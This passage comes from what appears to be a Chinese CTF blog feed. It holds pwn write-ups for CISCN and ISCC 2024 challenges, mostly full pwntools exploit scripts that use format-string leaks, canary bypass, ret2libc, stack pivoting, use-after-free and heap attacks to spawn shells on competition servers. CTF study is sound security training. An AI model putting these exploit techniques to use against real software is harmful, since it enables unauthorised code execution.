class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base=(leak-libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">libc.address=libc_base</span><br><span class="line">bin_sh_addr=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x240</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x501</span>))</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x340</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x101</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x401</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x240</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x4e1</span>))    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x240</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x21</span>)+p64((heap_base&gt;&gt;<span class="number">12</span>)^(libc.sym[<span class="string">&#x27;environ&#x27;</span>]-<span class="number">0x10</span>))+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x4e1</span>))    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">stack_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-(<span class="number">0x758</span>-<span class="number">0x5f0</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax; ret&#x27;</span>)))</span><br><span class="line">pop_rdi_ret=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>)))</span><br><span class="line">pop_rsi_ret=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi; ret&#x27;</span>)))</span><br><span class="line">pop_rdx_ret=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx; pop rbx; ret&#x27;</span>)))</span><br><span class="line">syscall_ret=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall; ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">pay+=p64(pop_rdi_ret)+p64(stack_addr-<span class="number">0x10</span>)</span><br><span class="line">pay+=p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(pop_rax_ret)+p64(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay+=p64(syscall_ret)</span><br><span class="line">pay+=p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">pay+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">pay+=p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)*<span class="number">2</span></span><br><span class="line">pay+=p64(pop_rsi_ret)+p64(stack_addr-<span class="number">0x300</span>)</span><br><span class="line">pay+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">pay+=p64(pop_rax_ret)+p64(<span class="number">1</span>)</span><br><span class="line">pay+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">pay+=p64(pop_rsi_ret)+p64(stack_addr-<span class="number">0x300</span>)</span><br><span class="line">pay+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x440</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x201</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x301</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x440</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x201</span>)+p64((heap_base&gt;&gt;<span class="number">12</span>)^(stack_addr-<span class="number">0x10</span>))+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x301</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f0</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>,pay)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;heap_base:&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/ciscnwp/image-20240519185504236.png" alt="image-20240519185504236"></p><p>获得flag</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ciscn wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>isccwp 2024</title>
      <link href="/2024/05/17/isccwp/"/>
      <url>/2024/05/17/isccwp/</url>
      
        <content type="html"><![CDATA[<h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>​checksec 查看保护发现保护全开，拖IDA一下子就看到了一个大大的backdoor</p><p><img src="/2024/05/17/isccwp/image-20240517134414225.png" alt="image-20240517134414225"></p><p><img src="/2024/05/17/isccwp/image-20240517134638726.png" alt="image-20240517134638726"></p><p>​然后就想着挟持程序流到<code>backdoor</code>,反编译一下</p><p><img src="/2024/05/17/isccwp/image-20240517135920892.png" alt="image-20240517135920892"></p><p>​发现仅有一个格式化字符串漏洞，所以可以格式化字符串泄露栈地址和程序地址后计算偏移直接跳转过去。</p><p>​s1位于栈上，栈上的format String还是很好打的</p><p><img src="/2024/05/17/isccwp/image-20240517140208807.png" alt="image-20240517140208807"></p><p>首先观察一下栈上有没有什么有用的数据，顺便测下偏移（注意这里的偏移不是地址偏移，而是%p这类format String在匹配地址时的偏移）</p><p><img src="/2024/05/17/isccwp/image-20240517140811490.png" alt="image-20240517140811490"></p><p>可以看到第9个%p被换成了一连串的0x61，所以我们填充了8个a的地方的偏移为9，将断点下到printf函数，查看此时stack结构。</p><p><img src="/2024/05/17/isccwp/image-20240517141602848.png" alt="image-20240517141602848"></p><p>因为我们仅需要canary及程序地址（因为开启了pie，为了推测程序中相关gadgets此时加载位置需要程序地址）,计算偏移泄露这两个数即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;flagisa%15$p%17$p&#x27;</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,payload)</span><br><span class="line">canary = <span class="built_in">int</span>(sh.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">mainbk_addr = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>随后栈溢出挟持程序流跳转到<code>backdoor</code>即可，注意需要把canary放在正确的位置，绕过canary检测。因为在while循环中，函数不会直接退出，还要重新发送一次<code>exit</code> </p><p>exploit:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">backdoor = <span class="number">0x1291</span></span><br><span class="line">mainbk = <span class="number">0x1520</span></span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;182.92.237.102&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"><span class="comment"># 栈底偏移 16</span></span><br><span class="line">payload = <span class="string">b&#x27;flagisa%15$p%17$p&#x27;</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,payload)</span><br><span class="line">canary = <span class="built_in">int</span>(sh.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">mainbk_addr = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">backdoor_addr = mainbk_addr - (mainbk-backdoor)</span><br><span class="line">payload = p64(canary).rjust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(<span class="number">0</span>) + p64(backdoor_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,payload)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;mainbk_addr is 0x%x&quot;</span> %mainbk_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="iscc-easy"><a href="#iscc-easy" class="headerlink" title="iscc_easy"></a>iscc_easy</h2><p>​首先查看保护并拖入IDA反编译</p><p><img src="/2024/05/17/isccwp/image-20240520161808642.png" alt="image-20240520161808642"></p><p><img src="/2024/05/17/isccwp/image-20240520161834112.png" alt="image-20240520161834112"></p><p>main 函数内无溢出，但有printf 的format漏洞，且仅当<code>x=5</code>时调用welcome函数。welcome内有栈溢出</p><p><img src="/2024/05/17/isccwp/image-20240520162307737.png" alt="image-20240520162307737"></p><p>所以思路就是想办法绕过<code>x==5</code>的检测，然后进行栈溢出,随后就像是一道ret2libc的板子题</p><p>exploit：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pwn_path = &quot;./ISCC_easy&quot;</span><br><span class="line">libc_path = &quot;libc6-i386_2.31-0ubuntu9.14_amd64.so&quot;</span><br><span class="line"># sh = process(pwn_path)</span><br><span class="line">sh = remote(&quot;182.92.237.102&quot;,10013)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"># set x = 5</span><br><span class="line">payload = p32(0x0804C030) + b&#x27;a%4$hhn&#x27;</span><br><span class="line">sh.sendafter(b&quot;Let&#x27;s have fun!\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"># leak libc_base</span><br><span class="line">call_welcome = 0x08049372</span><br><span class="line">puts_plt = 0x080490D0</span><br><span class="line">puts_got = 0x0804C014</span><br><span class="line">payload = b&#x27;a&#x27;*0x94 + p32(puts_plt) + p32(call_welcome) + p32(puts_got)</span><br><span class="line">sh.sendafter(b&quot;Input:\n&quot;,payload)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">str_binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">log.info(&quot;puts_addr is 0x%x&quot; %puts_addr)</span><br><span class="line">log.info(&quot;ilbc_base is 0x%x&quot; %libc_base)</span><br><span class="line">log.info(&quot;system_addr is 0x%x&quot; %system_addr)</span><br><span class="line">log.info(&quot;str_binsh_addr is 0x%x&quot; %str_binsh_addr)</span><br><span class="line"></span><br><span class="line"># get shell</span><br><span class="line">payload = b&#x27;a&#x27;*0x94 + p32(system_addr) + p32(0) + p32(str_binsh_addr)</span><br><span class="line">sh.sendafter(b&quot;Input:\n&quot;,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>​查看保护并拖入IDA反汇编</p><p><img src="/2024/05/17/isccwp/image-20240520163749065.png" alt="image-20240520163749065"></p><p><img src="/2024/05/17/isccwp/image-20240520163935200.png" alt="image-20240520163935200"></p><p>在weclome函数中发现如果我们的输入和<code>help.txt</code>文件中的不一样时，就会被printf出来,此过程可以触发format string漏洞。</p><p>随后发现在第二个函数中可以栈溢出</p><p><img src="/2024/05/17/isccwp/image-20240520164653612.png" alt="image-20240520164653612"></p><p>所以我们的思路就是第一处进入点尽可能泄露canary和libc_base，第二处进入点直接执行提权函数。但是很可惜，调试的时候在栈上没找到泄露libc的机会。那就正常打带canary的ret2libc （此时canary已知）</p><p>分析完毕，开始实践：</p><p>​很怪，没发现我们的测试序列（‘aaaa’）,于是再看一眼format，发现函数定义是指针，没法儿用这种方法测偏移了</p><p><img src="/2024/05/17/isccwp/image-20240520191927414.png" alt="image-20240520191927414"></p><p>断点下到call printf的位置，观察此时栈结构</p><p><img src="/2024/05/17/isccwp/image-20240520193038361.png" alt="image-20240520193038361"></p><p>不出所料的话bp寄存器指向位置的偏移应该是0x16，canary的偏移应该是0x13</p><p><img src="/2024/05/17/isccwp/image-20240520194010972.png" alt="image-20240520194010972"></p><p>果真如此，之后就是正常的带canary的ret2libc,canary已经到手了，直接构建ROP链即可</p><p>我这里还额外进行了栈迁移，原因是误以为<code>0x100-0x94=12</code>,hhh <a href="https://www.yuque.com/xunan-00qkz/am8r3r/pnl1hqul9utzwe52?singleDoc#">具体原因见此</a></p><p>exploit:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">sh = process(&quot;./pwn&quot;)</span><br><span class="line">sh = remote(&quot;182.92.237.102&quot;,10012)</span><br><span class="line"># ebp 偏移是 0x16 . format</span><br><span class="line">payload = b&#x27;aaaa%19$p%22$p&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(b&#x27;aaaa&#x27;)</span><br><span class="line">canary = int(sh.recv(10),16)</span><br><span class="line">stack_buf = int(sh.recv(10),16)-0x94-0x10</span><br><span class="line">log.info(&quot;canary is 0x%x&quot; %canary)</span><br><span class="line">log.info(&quot;stack_buf is 0x%x&quot; %stack_buf)</span><br><span class="line"></span><br><span class="line"># 栈迁移</span><br><span class="line">ret = 0x0804900e</span><br><span class="line">leave_ret = 0x080494C0</span><br><span class="line">puts_plt = 0x08049134</span><br><span class="line">puts_got = 0x0804C01C</span><br><span class="line">bck_addr = 0x0804931B</span><br><span class="line">pop_ebx_ret = 0x08049022</span><br><span class="line"># 栈迁移然后puts泄漏libc，随后执行提权函数。所以这就是一道带栈迁移的libc类型题。</span><br><span class="line">payload = flat([stack_buf,puts_plt,bck_addr,puts_got])</span><br><span class="line">payload = payload.ljust(0x88,b&#x27;a&#x27;) + p32(canary) + p32(0)*2 + p32(stack_buf) + p32(leave_ret)</span><br><span class="line">sh.sendafter(b&quot;Input:\n&quot;,payload)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">log.info(&quot;puts_addr is 0x%x&quot; %puts_addr)</span><br><span class="line"></span><br><span class="line"># 推测system和binsh</span><br><span class="line">system = puts_addr - 0x2b110</span><br><span class="line">binsh = puts_addr + 0x149e95</span><br><span class="line">system = puts_addr - 0x06d1e0 +  0x041360</span><br><span class="line">binsh = puts_addr - 0x06d1e0 +   0x18c363</span><br><span class="line">log.info(&quot;system is 0x%x&quot; %system)</span><br><span class="line">log.info(&quot;binsh is 0x%x&quot; %binsh)</span><br><span class="line">payload = flat([stack_buf,system,bck_addr,binsh])</span><br><span class="line">payload = payload.ljust(0x88,b&#x27;a&#x27;) + p32(canary) + p32(0)*2 + p32(stack_buf+0x8-0x94) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.sendafter(b&quot;Input:\n&quot;,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p>拖入ida，发现后门</p><p><img src="/2024/05/17/isccwp/image-20240520211225993.png" alt="image-20240520211225993"></p><p>直接走后门拿到权限</p><p><img src="/2024/05/17/isccwp/image-20240520211138008.png" alt="image-20240520211138008"></p><h2 id="shopping"><a href="#shopping" class="headerlink" title="shopping"></a>shopping</h2><p>无pie，仅能申请堆块，多线程</p><p><img src="/2024/05/17/isccwp/image-20240521165306573.png" alt="image-20240521165306573"></p><p>申请堆块到 第二个堆块尾部，并利用堆溢出控制thread arena</p><p><img src="/2024/05/17/isccwp/image-20240521165016992.png" alt="image-20240521165016992"></p><p><img src="/2024/05/17/isccwp/image-20240521165245817.png" alt="image-20240521165245817"></p><p>将堆块申请到bss段0x602038附近，并在此处挟持程序流。</p><p><img src="/2024/05/17/isccwp/image-20240521194916156.png" alt="image-20240521194916156"></p><p>exploit:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#re=process(&quot;./pwn&quot;)</span></span><br><span class="line">re=remote(<span class="string">&quot;182.92.237.102&quot;</span>,<span class="number">10019</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">        gdb.attach(re)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,n,pay=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    re.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    re.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    re.recvuntil(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">    re.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    re.recvuntil(<span class="string">&quot;Quantity: &quot;</span>)</span><br><span class="line">    re.sendline(<span class="built_in">str</span>(n))</span><br><span class="line">    re.recvuntil(<span class="string">&quot;1): &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> pay ==<span class="string">&quot;&quot;</span>:</span><br><span class="line">       re.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">       re.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">       re.recvuntil(<span class="string">&quot;Message: &quot;</span>)</span><br><span class="line">       re.send(pay)</span><br><span class="line">re.recvuntil(<span class="string">&quot;ord: \n&quot;</span>)</span><br><span class="line">pay=<span class="string">b&quot;I&#x27;m ready for shopping&quot;</span></span><br><span class="line">re.sendline(pay)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">     add(<span class="number">0x4000</span>,<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">0x4000</span>,<span class="number">262</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3ff0</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">pause()</span><br><span class="line">pay=<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span>+p32(<span class="number">0</span>)+p32(<span class="number">3</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p32(<span class="number">0x60201d</span>)</span><br><span class="line">re.send(pay)</span><br><span class="line">pause()</span><br><span class="line">system=<span class="number">0x400978</span></span><br><span class="line">pay=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(system)</span><br><span class="line">pay=pay.ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,pay)</span><br><span class="line">re.interactive()</span><br></pre></td></tr></table></figure><p>得到flag:</p><p><img src="/2024/05/17/isccwp/image-20240521195441346.png" alt="image-20240521195441346"></p><h2 id="ISCC-U"><a href="#ISCC-U" class="headerlink" title="ISCC_U"></a>ISCC_U</h2><p>做这道题的时候遇到了个特别坑的事儿，在本地跑的通，但是在远程不行，报错信息提示说引号不匹配，到最后打印system执行的命令内容才知道，原来前面的地址中有一字节刚好对应单引号 &#96;。只能说一整个无语住了，记录一下，长个记性。</p><p>我有点怀疑自己的这个是否是非预期解，因为本次漏洞利用并未涉及栈</p><p><img src="/2024/05/17/isccwp/1715599350023-493bd77b-c37d-4d3c-9fce-cc661f20b1ed.webp" alt="image.png"></p><p>一黄两绿，无pie；malloc，show，delete完好，无edit</p><p>注意到add函数执行时会申请两个chunk，为表述方便，分别将其称作chunk_a和chunk_b。chunk_a用来存放print_note_content地址和chunk_b地址，chunk_b是实际申请的大小，有UAF。而且delete时，两个堆块都会被free掉，所以再申请后利用UAF可以实现控制</p><p><img src="/2024/05/17/isccwp/1715600349697-51fca69a-bfa6-4e5a-ada6-0b23595ada48.webp" alt="image.png"></p><p><img src="/2024/05/17/isccwp/1715600442424-953809d0-6e67-48ae-bb99-296ef2c72a9b.webp" alt="image.png"></p><p>需要注意的是，这里的show功能实现比较怪，控制chunk_a内容后可用来挟持程序流</p><p><img src="/2024/05/17/isccwp/1715602407393-6111ba84-c929-431c-afe0-b6eb453bf26a.webp" alt="image.png"></p><p>首先挟持程序流leak libc ,随后挟持程序流执行提权函数。控制chunk_a方法如下：</p><p><img src="/2024/05/17/isccwp/1715602607262-035064b4-fba1-4471-8ad8-1e2aa6b9d890.webp" alt="image.png"></p><p>exploit：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./attachment-39&quot;</span></span><br><span class="line"></span><br><span class="line">sh = process(path)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># sh = remote(&quot;182.92.237.102&quot;,10016)</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,Content</span>):</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;What&#x27;s your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;Note size :&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;Content :&quot;</span>,Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Index</span>):</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;What&#x27;s your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;Index :&quot;</span>,<span class="built_in">str</span>(Index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>(<span class="params">Index</span>):</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;What&#x27;s your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line"></span><br><span class="line">​sh.sendafter(<span class="string">b&quot;Index :&quot;</span>,<span class="built_in">str</span>(Index).encode())</span><br><span class="line"></span><br><span class="line">print_note_content = <span class="number">0x80492b6</span></span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x0804C024</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># leak libc_base</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunkis_0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunkis_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunkis_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xc</span>,flat([print_note_content,puts_got]))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">printf(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;puts_addr is 0x%x&quot;</span> %puts_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># get shell</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># system_addr = puts_addr - 0x2b110</span></span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - <span class="number">0x2be80</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xc</span>,p32(system_addr)+<span class="string">b&quot;`;sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;命令：&quot;</span>+<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>((system_addr&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])+<span class="string">&quot;;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><p>​保护全开，四肢完整（仅能申请largebin）,禁用execve。</p><p><img src="/2024/05/17/isccwp/image-20240522134038070.png" alt="image-20240522134038070"></p><p>所以思路就是leak libc_base，然后largebin attack打<code>_IO_all_list</code>，挟持程序流打setcontext。将栈迁移到堆上打orw</p><p><img src="/2024/05/17/isccwp/image-20240522134646721.png" alt="image-20240522134646721"></p><p>exploit:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">&#x27;182.92.237.102&#x27;</span>,<span class="number">11000</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,Size</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Size&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(Size),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,Content</span>):</span><br><span class="line">    sh.recvuntil(<span 